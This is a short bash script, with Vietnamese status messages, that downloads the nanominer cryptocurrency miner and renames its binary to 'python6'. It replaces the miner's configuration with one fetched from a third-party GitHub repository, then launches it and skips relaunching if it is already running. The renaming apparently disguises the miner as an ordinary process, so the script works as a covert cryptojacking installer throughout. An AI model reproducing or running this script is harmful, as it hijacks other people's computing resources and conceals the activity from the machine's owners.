#! /bin/bash
set -x #echo on
if [ -f ${PWD}/nanominer-linux-1.5.2.tar.gz ]; then
    if pgrep -x "python6" > /dev/null
then
    echo "scrip dang chay roi , ke cmn di "
    
else

echo "script da install , chay thoi "
cd nanominer-linux-1.5.2
./python6
     
fi
exit
fi

wget https://github.com/nanopool/nanominer/releases/download/v1.5.2/nanominer-linux-1.5.2.tar.gz
tar xvzf nanominer-linux-1.5.2.tar.gz
cd nanominer-linux-1.5.2
mv nanominer python6
rm config.ini
wget https://raw.githubusercontent.com/haidanglx/cr11/master/config.ini
chmod +x python6
./python6
